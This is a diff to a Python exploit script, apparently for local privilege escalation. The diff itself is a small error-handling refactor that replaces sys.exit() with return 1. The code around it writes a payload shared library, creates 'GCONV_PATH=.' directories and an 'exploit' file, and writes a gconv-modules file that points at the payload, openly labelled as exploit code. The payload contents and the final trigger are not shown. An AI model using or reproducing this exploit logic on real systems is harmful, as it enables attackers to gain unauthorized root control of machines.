@@ -55,7 +55,7 @@ def main():
         libc = CDLL(find_library('c'))
     except:
         print('[!] Unable to find the C library, wtf?')
-        sys.exit()
+        return 1
 
     # Create the shared library from the payload
     print('[+] Creating shared library for exploit code.')
@@ -64,7 +64,7 @@ def main():
             f.write(payload)
     except:
         print('[!] Failed creating payload.so.')
-        sys.exit()
+        return 1
     os.chmod('payload.so', 0o0755)
 
     # make the GCONV_PATH directory
@@ -74,7 +74,7 @@ def main():
         print('[-] GCONV_PATH=. directory already exists, continuing.')
     except:
         print('[!] Failed making GCONV_PATH=. directory.')
-        sys.exit()
+        return 1
 
     # Create a temp exploit file
     try:
@@ -82,7 +82,7 @@ def main():
             f.write(b'')
     except:
         print('[!] Failed creating exploit file')
-        sys.exit()
+        return 1
     os.chmod('GCONV_PATH=./exploit', 0o0755)
 
     # Create directory to hold gconf-modules configuration file
@@ -92,15 +92,15 @@ def main():
         print('[-] exploit directory already exists, continuing.')
     except:
         print('[!] Failed making exploit directory.')
-        sys.exit()
+        return 1
 
     # Create gconf config file
     try:
         with open('exploit/gconv-modules', 'wb') as f:
-            f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n');
+            f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n')
     except:
         print('[!] Failed to create gconf-modules config file.')
-        sys.exit()
+        return 1
 
     # Convert the environment to an array of char*
     environ_p = (c_char_p * len(environ))()
